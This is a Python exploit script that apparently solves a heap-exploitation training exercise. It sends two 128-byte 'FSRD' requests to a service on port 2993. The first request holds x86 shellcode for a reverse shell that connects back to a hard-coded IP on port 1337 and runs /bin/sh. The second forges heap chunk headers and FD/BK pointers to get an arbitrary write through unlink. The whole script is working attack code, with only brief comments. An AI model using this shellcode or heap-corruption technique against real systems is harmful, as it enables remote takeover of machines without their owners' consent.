import os
import struct
import sys
import telnetlib
import socket
import binascii

size_reqd=128
socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socketObject.connect((sys.argv[1],2993))
IPv4="192.168.168.129"
hex_string=binascii.hexlify(socket.inet_aton(IPv4))
ip_network_byte_order=hex_string.decode("hex")

#assuming msg will be always smaller than 128
#The required size of message is 128 bytes INCLUDING "FSRD" string
#The msg must begin with "FSRD"
#This part will be the first calloc chunk and won't get over written
payload1="FSRD"
shellcode="\x90"*16
#"\xE9\x3C\xE0\x04\x08"
shellcode+="\x08\x04\xe0\x3c\xe9"
shellcode+="\x90"*24
shellcode+="\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68"+ip_network_byte_order+"\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload1+=shellcode
#total payload size is 128 bytes, and FSRD and slash are total 5 bytes
payload1+="\x90"*(123-len(shellcode))
payload1+="/"

socketObject.sendall(payload1)


#This is the part that will replace from the top of chunk2 after memmov,in order (prev_size+curr_size+BBBB (FD)+CCCC(BK)). The 2nd calloc, in the loop and 2nd request will be read.
payload2_header = "\xfc\xff\xff\xff" + "\xfe\xff\xff\xff" + "\x10\xd4\x04\x08" + "\x28\xe0\x04\x08"
#The part before payload2_header does not matter as it will get over loaded by payl
payload2 = "FSRD" + "ROOT" + "X"*(128-9-len(payload2_header)) + "/" + payload2_header

socketObject.sendall(payload2)


socketObject.close()
#No 3rd request so message sent will be lesser than 128 bytes.


##So to execute this we will again employ the "use-after-free exploit technique"
##Each request to the remote service must follow an enforced pattern of exact length of 128 bytes and the first 4 bytes should be FSRD
